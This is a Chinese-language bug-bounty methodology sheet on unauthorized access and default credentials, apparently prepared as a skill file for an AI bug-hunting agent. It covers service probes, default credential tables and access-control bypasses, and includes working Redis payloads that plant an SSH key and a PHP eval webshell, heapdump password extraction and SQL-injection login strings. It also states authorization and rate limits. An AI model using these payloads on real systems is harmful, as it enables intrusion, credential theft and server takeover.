# 未授权访问 / 默认凭据（Unauthorized Access / Default Credentials）

> 服务「该有鉴权却没有」或「鉴权可被绕过」。入口最浅、影响最重——单个 IP 扫描 + 一次 curl 即可拿数据/RCE。WooYun 88,636 漏洞中 **14,377 例（16.2%）** 是未授权访问（数据来源：本地 src-hunter WooYun 案例统计，非官方数据），是猎手最容易开胡的牌；Redis/Mongo 未授权、Actuator heapdump、Swagger/Druid 暴露常直接给 Critical。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（Swagger/OpenAPI 暴露部分）
- 权威公开源：HackTricks / PayloadsAllTheThings

---

## 1. 触发信号

- 端口扫描出现 6379 / 27017 / 9200 / 2375 / 10250 / 11211 / 2181 / 2379 / 873 等数据库/容器端口
- 访问 `/actuator/env` `/actuator/heapdump` 直接返回 JSON/二进制，无需登录
- `/swagger-ui.html` `/v2/api-docs` `/druid/index.html` 渲染出完整 API/监控列表
- 登录页用默认口令（`admin/admin`、`tomcat/tomcat`、`nacos/nacos`）一次成功
- 未登录访问 `/api/*` 管理接口返回 200 数据而非 302 跳登录

## 2. 高频入口点

### 2.1 数据库 / 缓存未授权 `[本地 src-hunter]`

| 服务 | 端口 | 验证命令 | 危害 |
|------|------|---------|------|
| Redis | 6379 | `redis-cli -h IP ping` → `PONG` | 写 SSH 公钥 / Webshell / 计划任务 → RCE |
| MongoDB | 27017 | `mongo IP:27017 --eval "db.version()"` | 全量数据导出 |
| Elasticsearch | 9200 | `curl IP:9200/_cat/indices` | 全索引数据 + Groovy RCE（旧版） |
| Memcached | 11211 | `echo stats \| nc IP 11211` | 数据 + DDoS 反射 |
| ZooKeeper | 2181 | `echo stat \| nc IP 2181` | 配置泄露 |
| Etcd | 2379 | `curl IP:2379/v2/keys/?recursive=true` | 配置 + token |
| Docker Remote API | 2375 | `curl IP:2375/info` | 容器逃逸 → 宿主 RCE |
| Kubelet | 10250/10255 | `curl -k https://IP:10250/pods` | 集群接管 |
| rsync | 873 | `rsync IP::` | 整站源码 |
| FTP | 21 | `ftp IP` → `anonymous` | 匿名访问 |
| Hadoop YARN | 8088 | `/cluster` | 提交 job → RCE |
| MySQL | 3306 | `mysql -h IP -u root` | 弱口令 / 空口令 |

### 2.2 中间件 / 管理面 `[本地 src-hunter]`

| 服务 | 默认端口 | 路径 | 默认凭据 |
|------|---------|------|---------|
| Tomcat | 8080 | `/manager/html` `/host-manager/html` | `tomcat/tomcat`、`admin/admin` |
| WebLogic | 7001 | `/console/` `/wls-wsat/` | `weblogic/weblogic`、`weblogic/weblogic1` |
| JBoss | 8080 | `/jmx-console/` `/invoker/JMXInvokerServlet` | `admin/admin` |
| Spring Boot Actuator | 8080 | `/actuator/env` `/actuator/heapdump` `/actuator/mappings` | 通常无 |
| Jenkins | 8080 | `/script` `/manage` | `admin/admin` |
| Grafana | 3000 | `/login` | `admin/admin` |
| Kibana | 5601 | `/` | 通常无 |
| phpMyAdmin | 80 | `/phpmyadmin/` `/pma/` `/myadmin/` | `root/空`、`root/root` |
| Zabbix | 80/8080 | `/zabbix/` | `Admin/zabbix` |

### 2.3 监控 / 文档 / 配置面（Swagger / Druid / Nacos）`[本地 src-hunter + Claude-BugHunter]`

| 组件 | 路径 | 默认凭据 |
|------|------|---------|
| Spring Actuator | `/actuator/env` `/actuator/heapdump` `/actuator/mappings` `/actuator/beans` `/actuator/configprops` | 无 |
| Swagger | `/swagger-ui.html` `/swagger/index.html` `/v2/api-docs` `/v3/api-docs` `/openapi.json` `/swagger.json` | 无 |
| Druid（阿里） | `/druid/index.html` `/druid/sql.html` `/druid/login.html` | `admin/admin`；无认证时 sql.html 直接访问 |
| Nacos | `/nacos/` | `nacos/nacos` |
| XXL-JOB | `/xxl-job-admin/` | `admin/123456` |
| RuoYi | `/login` | `admin/admin123` |
| Sentinel | `/` | `sentinel/sentinel` |
| Apollo | `/portal/` | `apollo/admin` |

### 2.4 未授权接口 / API `[本地 src-hunter + Claude-BugHunter]`

```
/api/v1/admin_is_login   /api/configs   /api/debug
/swagger-ui.html   /v2/api-docs   /openapi.json   /actuator/env
/.env   /metrics（Prometheus）
```

---

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **端口/服务指纹**：`nmap -sV` 扫常见端口，或 shodan/fofa 直接查该 IP。
2. **单服务一键探针**：redis `ping` / mongo `db.version()` / ES `_cat/indices`，只读命令，命中即停。
3. **管理路径探测**：ffuf 跑 admin-paths 字典（`admin/` `manager/` `console/` `jmx-console/` `phpmyadmin/` `swagger-ui.html` `actuator/env`...），`-mc 200,302,401`。
4. **默认凭据**：命中厂商指纹后只跑该厂商字典（限速 ≤50 次/小时，命中即停）。
5. **数据提取/升级（仅授权允许）**：heapdump 分析出密码 → 报告「凭据存在」即止，不真正连库。

## 4. Payload 区（每条标注出处）

### 4.1 基础探测 `[本地 src-hunter]`

```bash
# Redis
redis-cli -h target ping            # PONG → 未授权
redis-cli -h target info
# MongoDB
mongo target:27017 --eval "db.adminCommand('listDatabases')"
# Elasticsearch
curl -s http://target:9200/_cat/indices?v
curl -s "http://target:9200/_search?pretty&size=10"
# Docker Remote API
curl -s http://target:2375/info
curl -s http://target:2375/containers/json
# Memcached
echo -e "stats\nquit" | nc target 11211
# ZooKeeper
echo stat | nc target 2181
# rsync
rsync target::
# Spring Actuator 全枚举
for p in env heapdump mappings beans configprops trace logfile; do
  curl -s -o /dev/null -w "%{http_code} $p\n" http://target/actuator/$p
done
```

### 4.2 数据提取 / 进阶 `[本地 src-hunter]`

```bash
# Redis 未授权 → RCE 三板斧（仅授权场景演示；实际只做读类证明）
redis-cli -h target
> config set dir /root/.ssh/
> config set dbfilename authorized_keys
> set x "\n\nssh-rsa AAAA...你的公钥...\n\n"
> save
# Webshell（需 web 根 + 写权限）
> config set dir /var/www/html/
> config set dbfilename shell.php
> set x "<?php @eval($_POST['c']);?>"
> save

# MongoDB 导出（仅取样本）
mongoexport -h target -d <db> -c <coll> -o out.json

# Actuator heapdump → 数据库密码
curl http://target/actuator/heapdump -o heap.bin
strings heap.bin | grep -iE "(password|jdbc|secret|key)" | sort -u
```

### 4.3 Bypass 矩阵 `[本地 src-hunter §4]`

| 防护 | 绕过 |
|------|------|
| IP 白名单 | `X-Forwarded-For` `X-Real-IP` `X-Originating-IP` `X-Client-IP` `Client-IP` `Forwarded: for=127.0.0.1` |
| Host 白名单 | `Host: localhost` `Host: 127.0.0.1` 双 Host header |
| 路径鉴权 | `/admin` 拦 → `/admin/` `/admin/.` `//admin` `/admin;param` `/Admin` `%2fadmin` `/api/../admin` |
| Method 限制 | GET 拦 → 试 POST / OPTIONS / `X-HTTP-Method-Override: GET` |
| 万能密码 | `' or '1'='1` `admin'--` `admin'#` |

## 5. 工具用法

```bash
# 端口指纹
nmap -sV -p 21,80,443,873,2181,2375,2379,3000,3306,5601,6379,7001,8080,8088,8443,9200,10250,11211,27017 target
shodan host IP
fofa "ip=\"target\""

# 管理路径 fuzz（限速 1–5 rps）
ffuf -u http://target/FUZZ -w admin-paths.txt -mc 200,302,401

# 默认凭据枚举（限速）
hydra -L users.txt -P pass.txt -t 4 -W 2 target http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

> 纪律：hydra `-t 4 -W 2`；单目标 ≤50 次/小时、命中即停；不无脑撒所有字典——先指纹定位厂商，只跑该厂商凭据。

## 6. 证据要求

**「已确认」必须满足**：未授权接口返回 200 + 敏感数据（保存完整 HTTP 包 + 截图）；或默认凭据登录成功（截图登录后首页，不进入业务操作）。

**PoC 模板**：

```http
GET /actuator/env HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
Content-Type: application/vnd.spring-boot.actuator.v3+json
{"activeProfiles":["prod"],"propertySources":[{"name":"...","properties":{"spring.datasource.password":{"value":"******"}}}]}
```

> 敏感数据 4 字符以上用 `******` 替换，保留键名和结构。

**CVSS 参考**：

```
未授权 RCE       CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
未授权数据导出    CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 High
未授权管理后台    CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1 Critical
默认凭据后台     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
```

## 7. 合规边界 / 不要做的事

- **禁**：用 Redis/Mongo 写马、留 webshell、上 cron。只做读类证明（`info`/`ping`/`db.version()`/`listDatabases`）；需写文件验证时写明显 PoC 文件名（`poc-YYYY-MM-DD.txt`）并立即清理。
- **禁**：从 Mongo/ES 拖超过 10 条用户记录，取 1–3 条脱敏即可。
- **禁**：用默认凭据登录后使用功能（建用户、删数据），仅证明可登录即退出。
- **禁**：扫描 `/16` 以上网段；path fuzz 1–5 rps 单机不并发。
- **禁**：heapdump / 备份文件传第三方网盘，本地保存报告后删除。
- **脱敏**：内网 IP、域名、用户名、手机号、邮箱、token 一律脱敏。
